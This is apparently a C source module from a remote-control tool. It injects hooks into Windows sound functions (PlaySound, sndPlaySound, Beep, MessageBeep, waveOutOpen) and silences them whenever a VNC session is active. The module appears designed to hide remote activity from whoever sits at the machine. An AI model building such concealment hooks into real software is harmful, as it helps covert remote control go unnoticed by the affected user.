#include "injlib.h"
#include "vncsilence.h"

#pragma optimize("",off)
DEF_HOOK(PlaySoundA);
BOOL WINAPI PlaySoundA_handler(LPCSTR pszSound,HMODULE hmod,DWORD fdwSound)
{
    if ((lpServer) && (lpServer->bIsVNC))
        return TRUE;

    REAL_API(PlaySoundA)
        return FALSE;
    return lpPlaySoundA(pszSound,hmod,fdwSound);
}

DEF_HOOK(PlaySoundW);
BOOL WINAPI PlaySoundW_handler(LPCWSTR pszSound,HMODULE hmod,DWORD fdwSound)
{
    if ((lpServer) && (lpServer->bIsVNC))
        return TRUE;

    REAL_API(PlaySoundW)
        return FALSE;
    return lpPlaySoundW(pszSound,hmod,fdwSound);
}

DEF_HOOK(sndPlaySoundA);
BOOL WINAPI sndPlaySoundA_handler(LPCSTR pszSound,UINT fuSound)
{
    if ((lpServer) && (lpServer->bIsVNC))
        return TRUE;

    REAL_API(sndPlaySoundA)
        return FALSE;
    return lpsndPlaySoundA(pszSound,fuSound);
}

DEF_HOOK(sndPlaySoundW);
BOOL WINAPI sndPlaySoundW_handler(LPCWSTR pszSound,UINT fuSound)
{
    if ((lpServer) && (lpServer->bIsVNC))
        return TRUE;

    REAL_API(sndPlaySoundW)
        return FALSE;
    return lpsndPlaySoundW(pszSound,fuSound);
}
#pragma optimize("",on)

DEF_HOOK(Beep);
BOOL WINAPI Beep_handler(DWORD dwFreq,DWORD dwDuration)
{
    if ((lpServer) && (lpServer->bIsVNC))
        return TRUE;

    REAL_API(Beep)
        return FALSE;
    return lpBeep(dwFreq,dwDuration);
}

DEF_HOOK(MessageBeep);
BOOL WINAPI MessageBeep_handler(UINT uType)
{
    if ((lpServer) && (lpServer->bIsVNC))
        return TRUE;

    REAL_API(MessageBeep)
        return FALSE;
    return lpMessageBeep(uType);
}

DEF_HOOK(waveOutOpen);
MMRESULT WINAPI waveOutOpen_handler(LPHWAVEOUT phwo,UINT_PTR uDeviceID,LPWAVEFORMATEX pwfx,DWORD_PTR dwCallback,DWORD_PTR dwCallbackInstance,DWORD fdwOpen)
{
    if ((lpServer) && (lpServer->bIsVNC))
        return MMSYSERR_NOMEM;

    REAL_API(waveOutOpen)
        return NULL;
    return lpwaveOutOpen(phwo,uDeviceID,pwfx,dwCallback,dwCallbackInstance,fdwOpen);
}


